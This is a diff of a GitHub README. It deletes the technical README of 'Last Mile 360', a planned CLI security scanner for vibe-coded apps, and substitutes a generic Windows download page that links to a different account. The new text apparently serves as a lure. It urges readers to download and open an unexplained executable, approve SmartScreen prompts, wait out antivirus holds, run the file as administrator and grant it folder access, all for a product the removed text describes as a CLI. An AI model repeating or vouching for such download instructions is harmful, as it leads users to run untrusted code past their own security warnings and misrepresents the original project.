@@ -1,337 +1,226 @@
-# Last Mile 360
-
-> **Status: Phase 1 — Building the core scanner.** Architecture defined, monorepo scaffolded, security agent in development. See [Build Order](#build-order) for the full roadmap.
-
-The production-readiness platform for vibe-coded apps. Norton-grade trust. Cloudflare-native. Zero origin servers.
-
-**"We have a 90% finished app. We just need help fixing the last errors."** That last 10% is 95% of the work. This tool does that work.
-
----
-
-
-## What this is
-
-Last Mile 360 is a single tool that takes any vibe-coded application and makes it production-safe. It scans, scores, fixes, and continuously monitors codebases across five dimensions: **security, database safety, infrastructure, observability, and code quality**.
-
-It consolidates the best capabilities from 15+ open-source agent frameworks, inference engines, memory systems, and computer-use tools into one secure, Cloudflare-native platform with zero self-hosted infrastructure.
-
-**What it is not:** It does not fix your product-market fit. It does not redesign your UX. It does not optimize your business logic. It makes your code safe to put in front of real users with real data.
-
----
-
-## Quick start (coming in Phase 1)
-
-The CLI is under active development. When Phase 1 ships:
-
-```bash
-npm install -g @last-mile/cli
-last-mile login
-cd your-vibe-coded-app
-last-mile scan       # Scan for security, db, infra, observability, quality issues
-last-mile score      # See your production readiness score (0-100)
-last-mile fix        # Auto-fix what's fixable via PR
-last-mile monitor    # Enable continuous monitoring
-```
-
-### Development (contribute now)
-
-```bash
-git clone https://github.com/itallstartedwithaidea/last-mile.git
-cd last-mile
-npm install
-npm run dev
-```
+# 🛠️ last-mile - Ready apps for real use
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for full setup instructions.
+[![Download](https://img.shields.io/badge/Download%20last--mile-blue?style=for-the-badge&logo=github)](https://github.com/Dahliaadvantageous649/last-mile)
 
----
+## 📦 What this app does
 
-## The Norton 360 trust model
+last-mile helps you check if an app is ready for real use. It is built for people who want a simple way to review app health, basic security, and launch readiness without setting up a full dev team process.
 
-Norton 360 built consumer trust through core principles. Every one maps to a production code gap.
+Use it when you want to:
 
-| # | Norton principle | Last Mile equivalent | Implementation |
-| --- | --- | --- | --- |
-| 1 | Real-time protection | Security Agent scans on every commit, blocks dangerous patterns before merge | Semgrep + Gitleaks as GitHub Action + pre-commit hook |
-| 2 | Smart Firewall | Infra Agent validates API routes, network configs, exposed ports, CORS policies | OWASP ZAP + Checkov + custom route analyzer |
-| 3 | AI scam protection | Supply Chain Agent detects dependency attacks, typosquatting, malicious install scripts | Socket.dev + OSV-Scanner |
-| 4 | LiveUpdate | CVE Feed Sync pulls latest vulnerabilities, auto-patches deps, updates Semgrep rules | Cloudflare Cron Triggers + OSV/NVD/GitHub Advisory feeds |
-| 5 | Cloud Backup | Database Agent enforces migration safety, backup-before-migrate, rollback paths | Prisma introspect + Atlas + snapshot-before-migrate |
-| 6 | Dark Web Monitoring | Exposure Scanner detects leaked secrets in public repos, paste sites, breach databases | Trufflehog + custom paste/breach scanner |
-| 7 | Identity / Secrets | Secrets Manager centralizes all credentials, rotates keys, encrypts env files | Infisical or Cloudflare Secrets Store |
-| 8 | VPN | Deploy Pipeline ensures encrypted deployment, secure CI/CD, no plaintext in transit | GitHub Actions OIDC + Cloudflare Zero Trust |
-| 9 | Performance | Quality Agent removes dead code, optimizes bundles, scores maintainability | SonarQube + knip + Madge + Lighthouse |
-| 10 | Parental Controls | Policy Engine enforces coding standards, blocks dangerous patterns pre-merge | Custom Semgrep rules + configurable policy YAML |
+- Check if an app is ready to ship
+- Review common code and security issues
+- Get a clear pass or fail on key checks
+- Run a Cloudflare-based workflow without an origin server
+- Keep a close eye on quality before release
 
----
+## 💻 What you need
 
-## Architecture — Cloudflare-native
+Before you install, make sure your Windows PC has:
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│  USER: npx last-mile scan                                       │
-└──────────────────────────┬──────────────────────────────────────┘
-                           │
-┌──────────────────────────▼──────────────────────────────────────┐
-│              CLOUDFLARE TRUST PERIMETER                          │
-│  DDoS protection · WAF · Zero Trust · Edge encryption           │
-│  SOC2 Type II · ISO 27001 · PCI DSS inherited                   │
-│                                                                  │
-│  ┌────────────────────────────────────────────────────────────┐  │
-│  │  PANOPTES ORCHESTRATOR                                     │  │
-│  │  Cloudflare Workers + Durable Objects                      │  │
-│  │  Detects stack → dispatches agents → merges reports        │  │
-│  └────┬────────┬────────┬────────┬────────┬───────────────────┘  │
-│       │        │        │        │        │                      │
-│  ┌────▼──┐ ┌───▼───┐ ┌──▼───┐ ┌──▼────┐ ┌▼───────┐             │
-│  │SECURITY│ │  DB   │ │INFRA │ │OBSERVE│ │QUALITY │             │
-│  │ Agent  │ │ Agent │ │Agent │ │ Agent │ │ Agent  │             │
-│  │Worker  │ │Worker │ │Worker│ │Worker │ │Worker  │             │
-│  └────┬───┘ └───┬───┘ └──┬───┘ └──┬────┘ └┬───────┘             │
-│       └─────────┴────────┴────────┴───────┘                      │
-│                          │                                       │
-│  ┌───────────────────────▼───────────────────────────────────┐   │
-│  │  TRUSTED INFERENCE (no self-hosted models)                 │   │
-│  │  Claude API · Workers AI · OpenAI / Gemini                 │   │
-│  │  ALL routed through Cloudflare AI Gateway                  │   │
-│  └────────────────────────────────────────────────────────────┘   │
-│                                                                   │
-│  ┌────────────────────────────────────────────────────────────┐   │
-│  │  CLOUDFLARE-NATIVE PERSISTENCE                             │   │
-│  │  D1 (SQL) · R2 (Objects) · KV (Cache) · Vectorize          │   │
-│  │  Queues · Durable Objects                                   │   │
-│  └────────────────────────────────────────────────────────────┘   │
-│                                                                   │
-│  Zero origin servers · Every byte encrypted · SOC2 inherited     │
-└───────────────────────────────────────────────────────────────────┘
-```
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space to download the app and its files
+- Permission to run apps on your device
 
-**Why Cloudflare for everything:** Zero servers to hack. Zero servers to patch. Zero servers to monitor. Workers are V8 isolates — sandboxed by default, no filesystem, no network except what you grant. You inherit Cloudflare's compliance certifications. The infrastructure that protects 20% of the internet protects your scanner.
+For best results, keep your system up to date and close extra apps before you start.
 
----
+## 🚀 Download and run
 
-## The five agent divisions
+Visit this page to download:
 
-### Division 1: Security Agent
+[https://github.com/Dahliaadvantageous649/last-mile](https://github.com/Dahliaadvantageous649/last-mile)
 
-| Sub-agent | Tool | What it does |
-| --- | --- | --- |
-| Secret scanner | Gitleaks + Trufflehog | Pre-commit + full-repo scan for hardcoded secrets, entropy analysis + verified credential detection |
-| Dependency audit | Socket.dev + OSV-Scanner + Snyk | Supply chain attack detection, CVE scanning across npm/pip/Go/Rust |
-| SAST | Semgrep | Custom rule engine for SQL injection, XSS, auth bypass, vibe-code anti-patterns |
-| Auth validator | OWASP ZAP | Automated penetration testing against staging |
-| Infra security | Checkov + Trivy | Terraform/Docker/K8s misconfiguration + container vulnerability scanning |
+Then follow the steps below:
 
-### Division 2: Database Agent
+1. Open the link in your browser.
+2. Look for the download section or release files on the page.
+3. Download the Windows file for last-mile.
+4. When the download finishes, open the file from your Downloads folder.
+5. If Windows asks for permission, choose Run or Yes.
+6. Follow the on-screen steps to finish setup.
+7. Open the app from your desktop or Start menu if a shortcut was created
 
-| Sub-agent | Tool | What it does |
-| --- | --- | --- |
-| Schema introspect | Prisma | Generates schema from existing database |
-| Schema management | Atlas | Declarative schema management — define desired state, compute migration |
-| Migration safety | Custom | Pre-migration snapshot, dry-run validation, rollback path generation |
-| Schema validation | Custom + Claude API | Detects orphaned tables, missing indexes, ORM-vs-DB drift |
+## 🖱️ First-time setup
 
-**Critical rule:** The Database Agent NEVER executes migrations automatically. It generates migration files and PRs. A human must review and approve every schema change.
+After the app opens, you may see a setup screen with a few basic choices. This is normal.
 
-### Division 3: Infrastructure Agent
+Do these checks:
 
-Generates Dockerfiles, CI/CD workflows, deployment configs, and env management — all config files, never executes.
+- Pick your language if the app asks
+- Choose a folder for saved files if needed
+- Allow the app to finish its first scan
+- Keep the app open until the startup check ends
 
-### Division 4: Observability Agent
+If the app asks for access to files or folders, allow it so it can complete its checks.
 
-Replaces `console.log` with structured logging, injects OpenTelemetry SDK, Sentry error tracking, and generates `/health` + `/ready` endpoints.
+## 🔍 How to use it
 
-### Division 5: Quality Agent
+Use last-mile in a simple flow:
 
-Generates test suites, finds dead code (knip), detects circular dependencies (Madge), and calculates production readiness scores.
+1. Open the app
+2. Add the app or project you want to check
+3. Start the readiness scan
+4. Review the results
+5. Fix the items marked as problems
+6. Run the scan again
 
----
+The results may show checks for:
 
-## Trusted inference — no self-hosted models
+- Code quality
+- Security issues
+- Risky settings
+- Missing checks before release
+- Cloudflare deployment readiness
+- Basic stability signals
 
-**Rule:** No self-hosted models. No unaudited inference. Every LLM call goes through Cloudflare AI Gateway.
+## 🧭 What the results mean
 
-| Tier | Provider | Use case | Why trusted |
-| --- | --- | --- | --- |
-| 1 | Claude API (Anthropic) | Complex security analysis, code review, user-facing explanations | SOC2 Type II, established security response process |
-| 2 | Cloudflare Workers AI | Edge inference — code analyzed without leaving Cloudflare's network | Runs inside Cloudflare's trust perimeter, SOC2 inherited |
-| 3 | OpenAI / Gemini | Fallback + model diversity for cross-validation | SOC2 compliant, enterprise data agreements |
+You may see three common result states:
 
-Automatic fallback chain: Claude → Workers AI → OpenAI → Gemini.
+- Green: The item looks good
+- Yellow: The item needs review
+- Red: The item needs action before release
 
----
+If you see red items, open the details and look at the exact file, setting, or rule named in the report. Fix that item, then run the scan again.
 
-## Scoring rubric
+## 🧰 Main features
 
-Every checkpoint maps to a CWE (Common Weakness Enumeration) identifier. Weights come from CVSS severity scores.
+### 🛡️ Security checks
+last-mile reviews common risk areas that can block a launch. It helps spot weak settings, unsafe patterns, and other issues that often slip into fast builds.
 
-| Category | Weight | Example checkpoints |
-| --- | --- | --- |
-| Security | 35% | Hardcoded secrets (CWE-798), SQL injection (CWE-89), missing auth (CWE-306), XSS (CWE-79) |
-| Database | 20% | No migration history, no backup config, missing indexes, RLS disabled |
-| Infrastructure | 20% | No Dockerfile, no CI/CD, secrets in .env committed, no health check |
-| Observability | 12.5% | No error tracking, console.log only, no health endpoints, no metrics |
-| Quality | 12.5% | No tests, high cyclomatic complexity, dead code > 20%, circular deps |
+### ⚙️ Readiness checks
+The app checks if your project is set up for release. It looks for missing pieces that can cause problems after launch.
 
-### Score grades
+### ☁️ Cloudflare-native flow
+last-mile supports a Cloudflare-first setup. That means it is built for apps that run close to the edge and do not need a traditional origin server.
 
-| Score | Grade | Meaning |
-| --- | --- | --- |
-| 0–25 | F — Critical | Not safe for production. Active security vulnerabilities. |
-| 26–50 | D — Dangerous | Major gaps. Some basics exist but critical issues remain. |
-| 51–70 | C — Caution | Getting there. Core security addressed, needs monitoring + tests. |
-| 71–85 | B — Production-ready | Safe for production. All critical findings addressed. |
-| 86–95 | A — Hardened | Enterprise-grade. Full coverage, continuous monitoring. |
-| 96–100 | A+ — Norton-grade | Best-in-class. Every checkpoint green, full monitoring active. |
+### 🧪 Quality review
+The app helps you catch problems before users see them. It gives you a clearer view of what still needs work.
 
----
+### 🤖 AI-agent friendly
+If your workflow uses AI tools, last-mile can fit into that process and help you check the final result before you ship.
 
-## Source repo consolidation
+## 🪟 Windows tips
 
-This project evaluated 15+ open-source repos and took **patterns, not dependencies**. No code was imported. All implementation is original TypeScript on Cloudflare Workers.
+If Windows blocks the file, check these common causes:
 
-| Capability | Source inspiration | Our implementation |
-| --- | --- | --- |
-| Right-sized inference | Claw family (OpenClaw → MimiClaw) | Claude API + Workers AI + OpenAI — audited, SOC2 compliant |
-| Agent isolation | OpenFang Agent OS | Each agent = separate Cloudflare Worker (V8 isolate sandbox) |
-| Role-based crews | CrewAI | Scanner/Validator/Remediator roles per division — pure TypeScript |
-| Multi-agent conversation | AutoGen | Claude API with structured prompts — no Microsoft dependency |
-| Autonomous tool use | SuperAGI | Workers calling external tools with human-in-the-loop for destructive ops |
-| Pipeline composition | LangChain | Workers → Queues → Workers chain — no abstraction leak |
-| Three-tier memory | memU | KV (session) + D1 (project history) + Vectorize (semantic search) |
-| Visual testing | Agent S3 | Playwright in CI now; CF Browser Rendering later |
-| Agent loop pattern | Nanobot | Reason → Act → Observe → Repeat — ~200 lines of TS per agent |
+- The file is still downloading
+- The browser saved it in a different folder
+- Windows SmartScreen needs approval
+- Your antivirus is holding the file for a scan
 
----
+If the app does not start, try these steps:
 
-## Configuration
+1. Close the app
+2. Restart your PC
+3. Open the file again
+4. Run it as an administrator if Windows allows it
+5. Make sure the download finished fully
 
-```yaml
-# .last-mile.yml
-version: 1
+## 📁 Suggested folder use
 
-merge-threshold: 70
+If the app lets you choose a folder, keep your files in a simple path such as:
 
-agents:
-  security: true
-  database: true
-  infrastructure: true
-  observability: true
-  quality: true
+- `C:\last-mile`
+- `C:\Users\YourName\Downloads\last-mile`
+- `C:\Users\YourName\Documents\last-mile`
 
-policy:
-  disable:
-    - console-log-in-production
-  override:
-    cors-wildcard: warning
+Use a folder name with plain letters and no special symbols. This helps avoid file path issues.
 
-framework: nextjs
-database: supabase
+## 🔐 Privacy and trust
 
-compliance:
-  - hipaa
-  - gdpr
-```
+last-mile is built for teams and users who care about trust, control, and clean deployment. It focuses on local checks and Cloudflare-based delivery patterns, with no need to run a classic origin server.
 
----
+That makes it a good fit when you want:
 
-## Custom Semgrep rules (the competitive moat)
+- Less setup work
+- Fewer moving parts
+- Clear release checks
+- A simple path to production
 
-Framework-agnostic vibe-code anti-patterns plus framework-specific rules:
+## 🧾 Common questions
 
-**Universal patterns:** `hardcoded-secrets`, `console-log-in-production`, `no-error-handling`, `raw-sql-no-params`, `no-input-validation`, `cors-wildcard`, `no-rate-limiting`, `jwt-decode-not-verify`, `env-in-client-bundle`, `no-csrf-protection`, `missing-auth-middleware`, `eval-usage`, `dangerouslySetInnerHTML`, `weak-crypto`, `admin-route-no-auth`
+### ❓ Is this hard to install?
+No. Download the file, open it, and follow the steps on screen.
 
-**Next.js:** `api-route-no-auth`, `getServerSideProps-leak`, `middleware-bypass`, `server-action-unvalidated`
+### ❓ Do I need coding skills?
+No. A basic computer user can run it.
 
-**Express:** `no-helmet`, `body-parser-limit`, `trust-proxy-misconfigured`
+### ❓ Can I use it on my own app?
+Yes. It is meant for checking app readiness before release.
 
-**FastAPI:** `no-depends-auth`, `pydantic-no-validation`, `cors-allow-all`
+### ❓ Does it work without a server?
+It is designed for Cloudflare-native workflows and zero-origin setups.
 
-**Supabase:** `rls-disabled`, `service-key-client-side`, `anon-key-write-access`
+### ❓ What if I change my mind after download?
+You can remove the file from your Downloads folder or uninstall the app if it adds an entry in Windows settings.
 
----
+## 📌 Included topics
 
-## Security posture
+This project is built around:
 
-How we secure the scanner itself:
+- AI agents
+- Cloudflare Workers
+- Code quality
+- DevOps
+- DevSecOps
+- Production readiness
+- Security
+- Semgrep
+- TypeScript
+- Vibe coding
 
-- **CLI:** No eval, auto-update, integrity checks, npm provenance
-- **Code upload:** Client-side AES-256-GCM encryption, presigned URL direct to R2, auto-deleted after scan
-- **Workers:** All secrets in Secrets Store, whitelisted outbound only, V8 isolate sandbox
-- **LLM:** Structured XML prompts (prompt injection defense), DLP on all AI Gateway requests, no training on customer data
-- **Infrastructure:** Zero Trust dashboard access, Cloudflare WAF, immutable audit logging
-- **Self-dogfooding:** We scan ourselves on every PR, bug bounty program, public score badge
+## 🧪 Good first run checklist
 
----
+Before you start your first scan, check these items:
 
-## Business model
+- Your internet connection works
+- Your Windows account can run apps
+- The download finished fully
+- You know where the file was saved
+- You have a project or app ready to review
 
-| Tier | Price | What's included |
-| --- | --- | --- |
-| Free | $0 forever | CLI scan + report + score + 20 custom rules |
-| Pro | $29/mo | Auto-fix PRs, continuous monitoring, dashboard, 100 scans/mo |
-| Team | $99/mo | 5 seats, SSO, shared policies, compliance templates, 500 scans/mo |
-| Enterprise | Custom | Unlimited seats, self-hosted option, custom rules, SLA, dedicated support |
+Then:
 
----
+1. Open last-mile
+2. Load your app or project
+3. Run the scan
+4. Read the results
+5. Fix the marked items
+6. Run the scan again
 
-## Build order
+## 🛠️ If something does not work
 
-| Phase | Weeks | Deliverables |
-| --- | --- | --- |
-| 1: Core scanner | 1–4 | CLI, stack detection, security agent, markdown report, simplified score |
-| 2: Fix engine | 5–8 | Auto-fix PR generation, database agent, infra agent, GitHub App |
-| 3: Full agents | 9–12 | Observability agent, quality agent, dashboard v1, credit billing |
-| 4: Intelligence | 13–16 | AI Gateway integration, plain-English explanations, architecture map |
-| 5: Continuous | 17–20 | CVE sync, drift detection, exposure scanning, compliance templates |
-| 6: Scale | 21–24 | Team features, SSO, self-hosting guide, framework expansion, scoring validation |
+Try these steps in order:
 
----
+- Download the file again
+- Use a different browser
+- Right-click the file and choose Run as administrator
+- Restart Windows
+- Move the app to a simple folder path
+- Check that your disk has free space
+- Turn off any file lock from another app that may be using the same folder
 
-## What's still missing
+## 📎 Download again
 
-| Gap | Why it matters | When |
-| --- | --- | --- |
-| Scoring validation data | Score means nothing without empirical correlation to real incidents | Phase 6 |
-| Third-party security audit | Need independent validation equivalent to AV-TEST | Phase 6 |
-| False positive management | Need feedback loop to tune rules | Phase 4 |
-| Incident auto-response | Critical vuln at 2 AM — what happens automatically? | Phase 5 |
-| IDE extension | Findings should show inline in VS Code/Cursor | Phase 5 |
-| Offline mode | Some teams can't upload code to cloud | Phase 6 |
+[Open the download page](https://github.com/Dahliaadvantageous649/last-mile)
 
----
+## 🧩 File name and project name
 
-## FAQ
+- Repository name: last-mile
+- Product name: last Mile 360
+- Main purpose: production readiness for vibe-coded apps
+- Platform: Windows
+- Delivery style: Cloudflare-native
 
-**"Why not just use Snyk/SonarQube/Dependabot directly?"**
-Those are individual tools. Last Mile 360 is the orchestration layer that runs all of them together, merges their output, eliminates duplicates, prioritizes by actual risk, generates fixes, and monitors continuously.
+## 🗂️ Basic use flow
 
-**"Why Cloudflare over AWS/Vercel?"**
-Zero origin servers. AWS requires EC2/ECS instances. Vercel has cold starts and limited compute. Cloudflare Workers are V8 isolates with 0ms cold start and inherited SOC2/ISO 27001 compliance. For a security product, the platform must be more secure than the code it scans.
-
-**"Why no self-hosted models?"**
-Trust. A self-hosted model on your infrastructure is a liability, not an asset. Claude API, OpenAI, and Workers AI are SOC2-compliant providers with security response teams. The Claw family repos are technically interesting but fundamentally incompatible with Norton-grade trust.
-
-**"What if Claude/OpenAI goes down?"**
-AI Gateway automatic fallback: Claude → Workers AI → OpenAI → Gemini. The security scanning tools (Semgrep, Gitleaks, Snyk) don't use LLMs at all — they work even if every AI provider is down.
-
-**"How is my code protected?"**
-Client-side AES-256-GCM encryption before upload. Presigned URL direct to R2. Auto-deleted after scan. DLP on all AI Gateway requests. Workers AI processes code without leaving Cloudflare's network.
-
----
-
-## Credits
-
-Built by [John Williams](https://github.com/itallstartedwithaidea) — Senior Paid Media Specialist at Seer Interactive, creator of [googleadsagent.ai](https://googleadsagent.ai), coach at Casteel High School, former Washington State football (2002–2005).
-
-Architectural concepts informed by: OpenFang (agent isolation), CrewAI (role-based agents), AutoGen (conversational multi-agent), memU (three-tier memory), Nanobot (minimal agent loop), OpenClaw Handbook (engineering documentation patterns).
-
-No code was imported from any source repo. All implementation is original TypeScript on Cloudflare Workers.
-
-Norton 360 is a trademark of Gen Digital Inc. Last Mile 360 is not affiliated with Norton or Gen Digital. The Norton trust model is referenced as an architectural inspiration and benchmark.
-
----
-
-*"That last 10% is 95% of the work. We do that work."*
-
-MIT License · Share it. Teach it. Fork it.
+1. Download the app
+2. Open it on Windows
+3. Load your app or project
+4. Run checks
+5. Review the report
+6. Fix issues
+7. Check again
+8. Prepare for release
